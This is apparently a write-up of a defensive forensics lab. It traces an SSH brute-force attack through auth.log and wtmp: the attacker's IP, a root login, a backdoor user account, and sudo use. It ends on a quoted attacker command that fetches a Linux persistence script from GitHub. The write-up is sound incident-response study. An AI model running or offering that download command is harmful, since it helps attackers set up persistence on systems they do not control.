# Brutus Lab Investigation  

## Objective  
The **Brutus Lab Investigation** focused on **analyzing SSH authentication logs (auth.log) and wtmp logs** to track an attack on a Confluence server. The attacker **brute-forced SSH credentials, escalated privileges, and created a backdoor account** for persistence. The primary goal was to identify attack patterns, detect unauthorized access, and correlate forensic evidence.  

### Skills Learned  

- **Log Analysis** – Investigating `auth.log` and `wtmp` for security incidents  
- **SSH Brute-Force Detection** – Identifying failed login attempts and attacker IPs  
- **Privilege Escalation Analysis** – Tracking unauthorized privilege gains  
- **Persistence Detection** – Recognizing attacker-created backdoor accounts  
- **Threat Intelligence Correlation** – Mapping findings to MITRE ATT&CK techniques  

### Tools Used  

- **Linux Command Line** – Log analysis (`grep`, `cat`, `awk`, `sed`)  
- **auth.log & wtmp** – Investigating login attempts and session tracking  
- **MITRE ATT&CK Framework** – Mapping attacker techniques (`T1136.001`)  
- **cURL** – Tracking malicious script downloads  

## Steps  

### **1. Identifying the Attacker's IP**  
- Analyzed **auth.log** for brute-force attempts  
- Identified repeated failed login attempts from **`65.2.161.68`**  

![Brute-force Attack Log](https://imgur.com/YRqEdFH.png)  
*Ref 1: Auth.log showing failed SSH login attempts from attacker IP*  

### **2. Tracking the Attack Timeline**  
- Discovered **successful login using "root" account**  
- Extracted **manual login timestamp: `2024-03-06 06:32:45`**  
- Identified **assigned session ID: `37`**  

![Attack Timeline](https://imgur.com/Qy2pA10.png)  
*Ref 2: Log analysis revealing successful root login and assigned session ID*  

### **3. Persistence Mechanism & Privilege Escalation**  
- Investigated **new user creation for persistence** (`cyberjunkie`)  
- Mapped persistence to **MITRE ATT&CK technique `T1136.001`**  
- Detected **attacker session termination at `2024-03-06 06:37:24`**  

![Persistence Mechanism](https://imgur.com/n3ygooB.png)  
*Ref 3: Evidence of attacker creating the "cyberjunkie" account for persistence*  

### **4. Tracking Malicious Activity with Sudo Logs**  
- Identified **attacker using sudo to download a script**  
- Extracted full command:  
  ```bash
  /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
